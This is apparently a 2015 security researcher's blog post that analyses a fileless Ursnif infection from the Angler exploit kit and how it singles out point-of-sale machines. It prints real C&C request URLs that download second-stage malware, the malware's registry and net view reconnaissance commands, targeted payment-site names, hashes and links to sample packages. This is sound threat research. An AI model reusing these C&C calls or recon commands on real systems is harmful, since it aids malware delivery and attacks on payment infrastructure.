<br /><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-9W3H1FTLYuw/VZl_TCbzR4I/AAAAAAAAE30/Nw7x-KxIWtE/s1600/2015-07-05_21h02_10.png"><img border="0" src="https://4.bp.blogspot.com/-9W3H1FTLYuw/VZl_TCbzR4I/AAAAAAAAE30/Nw7x-KxIWtE/s1600/2015-07-05_21h02_10.png" /></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Mission Impossible via <a href="https://www.flickr.com/photos/35385165@N05/6130349338/in/photostream/">Brixe63</a></span></div><br /><br />At begining of June, I noticed a "different" Angler pass.<br />No drop and Ursnif call backs.<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-RTGwCF2bqEs/VZlRft0h0pI/AAAAAAAAE2U/3qhOmXWsMjo/s1600/2015-07-05_17h46_52.png"><span style="font-size: xx-small;"><img border="0" src="https://1.bp.blogspot.com/-RTGwCF2bqEs/VZlRft0h0pI/AAAAAAAAE2U/3qhOmXWsMjo/s640/2015-07-05_17h46_52.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">FileLess Angler Pass and Ursnif Callback</span></div><div style="text-align: center;"><span style="font-size: xx-small;">Mon, 01 Jun 2015 14:48:06 GMT</span></div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><br /></div>I already encountered that "small ursnif" multiple time. In november for instance some 18ko sample pushed in Bedep  <a href="https://www.virustotal.com/file/0a38c363c8353140c6e90055e8812ab5b3255a04afe0bfbcb8c751107df3ba9b/analysis/">380278c243a03c70dba89af2e6d4916f</a> (grabbing a sample doing some IAP like callback - <a href="https://www.virustotal.com/intelligence/download/?sha256=43fce12aace6e73fc7b1e1117595816e">43fce12aace6e73fc7b1e1117595816e</a> )<br /><div style="text-align: center;"><br /></div><div style="text-align: center;"><span style="font-size: xx-small;"><a href="http://1.bp.blogspot.com/-fmYu1ihTDFY/VZll-jtiSZI/AAAAAAAAE2k/i49lfoBdYfk/s1600/2015-07-05_19h14_24.png"><img border="0" src="https://1.bp.blogspot.com/-fmYu1ihTDFY/VZll-jtiSZI/AAAAAAAAE2k/i49lfoBdYfk/s640/2015-07-05_19h14_24.png" /></a></span></div><div style="text-align: center;"><span style="font-size: xx-small;">Ursnif sent to Bedep infected VM</span></div><div style="text-align: center;"><span style="font-size: xx-small;">2014-11-07</span></div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><br /></div>and few days later : ff1da0bbfc66762dbc1b2af52425f211 <br /><br />C&amp;C calls in november 2014 :<br /><br /><span style="color: #351c75; font-size: x-small;"><i>GET http://ipsalomenatep58highwayroad .biz:8080/photoLibrary/?user=c54acfbc9b5eef3b729f4025c17cefa2&amp;id=1&amp;ver=105&amp;os=170393861&amp;os2=512&amp;host=0&amp;k=1859056880&amp;type=1<br />200 OK (text/html)<br /><br />GET http://ipsalomenatep58highwayroad .biz:8080/photoLibrary/?user=c54acfbc9b5eef3b729f4025c17cefa2&amp;id=1&amp;ver=105&amp;os=170393861&amp;os2=512&amp;host=0&amp;k=1039729551&amp;type=505<br />200 OK (text/html)  &lt; 2ndStage payload </i></span><br /><br />What is new in that June pass is the Fileless execution of this Ursnif. In that context seeing it making some net view and registry  CurrentVersion\Uninstall check <br /><br /><blockquote class="tr_bq"><span style="color: #351c75; font-size: x-small;"><i>cmd /C "reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName &gt; C:\Users\[REDACTED]\AppData\Local\Temp\28096234.TMP"</i></span><span style="color: #351c75; font-size: x-small;"><i><br /></i></span><span style="color: #351c75; font-size: x-small;"><i>cmd /C "net.exe view &gt; C:\Users\[REDACTED]\AppData\Local\Temp\28097562.TMP"</i></span></blockquote><br />before calling C&amp;C made me think this might be reco.<br /><br />XTea decoded from the PCAP the sample I got was  :<br /><a href="https://www.virustotal.com/file/2618c9e3f99942c6b1d2d3738abe6b1a97f5f504037882662771f6bb6baa4cf8/analysis/">a619632af465759a3d3d45f39f988c3f</a><br />Running it manually i got him to grab (call &amp;type=505) an Andromeda<br /><div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-vAfCEGRKinA/VZlp8R_5BWI/AAAAAAAAE24/o11kUykpP88/s1600/2015-07-05_19h30_45.png"><span style="font-size: xx-small;"><img border="0" src="https://2.bp.blogspot.com/-vAfCEGRKinA/VZlp8R_5BWI/AAAAAAAAE24/o11kUykpP88/s640/2015-07-05_19h30_45.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Fileless Ursnif calling C&amp;C, Grabbing Andromeda.</span></div><div style="text-align: center;"><span style="font-size: xx-small;">Andromeda Calling home.</span></div><div style="text-align: center;"><br /></div><br />Upon deeper looks it appears that this Ursnif is doing those kind of checks :<br /><br /><u>Case one :</u><br />- POS/SALE/STORE in the Netview output<br />- some URL in the cache :</div><div><blockquote class="tr_bq"><i><span style="color: #351c75;">choiceadvantage.com<br />uhauldealer.com<br />secure-booker.com<br />teletracker.com<br />wupos.westernunion.com<br />pay1.plugnpay.com<br />secure.paymentech.com/iterminal/</span></i></blockquote><u>Case two :</u><br />- some entries in the registry :<br />VeriFone  (advertises itself as the "global leader in secure electronic POS solutions")<br />(there are 2 strings Citrix and XenApp but do not seems to be directly called)<br /><br /><u>Case three : </u><br />- None of these..so "lower value" (for them) machine.<br /><br />I made some modif in my systems to fall in case one :</div><div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-HJszkcusw5M/VZlwfh_9alI/AAAAAAAAE3I/pdc2wcu8nHg/s1600/2015-06-21_17h37_30.png"><span style="font-size: xx-small;"><img border="0" src="https://4.bp.blogspot.com/-HJszkcusw5M/VZlwfh_9alI/AAAAAAAAE3I/pdc2wcu8nHg/s1600/2015-06-21_17h37_30.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Trying to get the attention of the Fileless Ursnif</span></div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><br /></div>And as expected it's something else than Andromeda that got dropped (c&amp;c call with &amp;type=555) on the machine</div><div><br /><a href="https://www.virustotal.com/file/f74c8ca0adfb38e9f38aad3f13bfcecf88fdc30a83a3bcd574f1640ed506189d/analysis/1434905738/">76c240311df959961200a20f52b4026c</a>&nbsp;which appears to be a signed<br /><br /><br /><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-OfuvuqbKLM8/VZlxXh8A4PI/AAAAAAAAE3Q/r-HgjTdi1VY/s1600/2015-06-21_21h07_18.png"><span style="font-size: xx-small;"><img border="0" src="https://3.bp.blogspot.com/-OfuvuqbKLM8/VZlxXh8A4PI/AAAAAAAAE3Q/r-HgjTdi1VY/s1600/2015-06-21_21h07_18.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Signed Dll dropped by the Fileless Ursnif</span></div><div style="text-align: center;"><br /></div>&nbsp;and decided to stand on the drive version of itself.</div><div><br /></div><div><b><u>Conclusion:</u></b> another smart use of the fileless capabilities of Angler.</div><div><br /></div><div><u>Side Note:</u><br />It seems type 666 and type 922 are other accepted call by the C&amp;C (one of them might be Verifone case)</div><div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-106XBn0wORY/VZl7BBa5X8I/AAAAAAAAE3g/9xRPEOobSds/s1600/2015-07-05_20h43_53.png"><span style="font-size: xx-small;"><img border="0" src="https://1.bp.blogspot.com/-106XBn0wORY/VZl7BBa5X8I/AAAAAAAAE3g/9xRPEOobSds/s640/2015-07-05_20h43_53.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Crafted C&amp;C Calls - note: &nbsp;type 666 and 922</span></div><br />Fiddler for those who can decrypt the traffic based on the Key is in the package (i'd be happy to hear about it )<br /><br /><a href="https://files.dontneedcoffee.com/index.php/s/1T3aobx8pcbLOH7">Here is a package</a> (multiple samples/pcap/fiddler)<br /><a href="https://files.dontneedcoffee.com/index.php/s/dBwxYQlP3sWUGUo">Fileless Angler EK Pass</a> (Pcap associated to first Screenshot&nbsp;)<br /><br />[Update : 2015-09-04]<br />It's pushed via Bedep those day :<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-EMx_0rh5ZrQ/VemGCnGrMFI/AAAAAAAAFGE/2vb-PMGvCDo/s1600/2015-09-04_13h49_23.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="92" src="https://3.bp.blogspot.com/-EMx_0rh5ZrQ/VemGCnGrMFI/AAAAAAAAFGE/2vb-PMGvCDo/s640/2015-09-04_13h49_23.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Fileless Ursnif pushed via Bedep but again no drop on disc (new to me method in bedep)<br />2015-09-04</td></tr></tbody></table>Sample :&nbsp;<span style="background-color: white; color: #333333; font-family: &quot;helvetica neue&quot; , &quot;helvetica&quot; , &quot;arial&quot; , sans-serif; font-size: 13px; line-height: 20px;"><a href="https://www.virustotal.com/en/file/b7d0aebab3c09601efb13b127f066641aafc88d89f6b803e390b8aa4c197835d/analysis/1441367711/">d8e950506fcb4617ef3bbcb16c4fba24</a></span><br />C&amp;C : lokingforrealest.net (82.211.31.126)<br />/yuppi/?user=c54acfbc9b5eef3b729f4025323a731c&amp;id=19&amp;ver=119&amp;os=170393861&amp;os2=512&amp;host=0&amp;k=88401496&amp;type=505<br /><br />31400 | 82.211.0.0/18 | ACCELERATED | DE | kundenbetreuung.org | IP-Projects GmbH &amp; Co. KG<br /><div>[/edit]</div><br /><br /><b><u>Thanks :</u></b><br /><a href="https://twitter.com/node5">Will Metcalf</a>, <a href="https://twitter.com/horgh_rce">Horgh_RCE</a> and <a href="https://www.fox-it.com/en/">FoxIT</a> for help/inputs.<br /><br /><b><u>Post Publication Readings :</u></b><br /><a href="https://www.fireeye.com/blog/threat-research/2016/05/windows-zero-day-payment-cards.html">Threat actor leverages windows zero-day exploit in payment card data attacks</a> - 2016-05-10 - FireEye<br /><a href="http://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/">PowerSniff Malware Used in Macro-based Attacks</a> - 2016-03-11 - Palot Alto<br /><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/angler-exploit-kit-used-to-find-and-infect-pos-systems/">Angler Exploit Kit Used to Find and Infect PoS Systems</a> - 2015-07-27 - TrendMicro</div>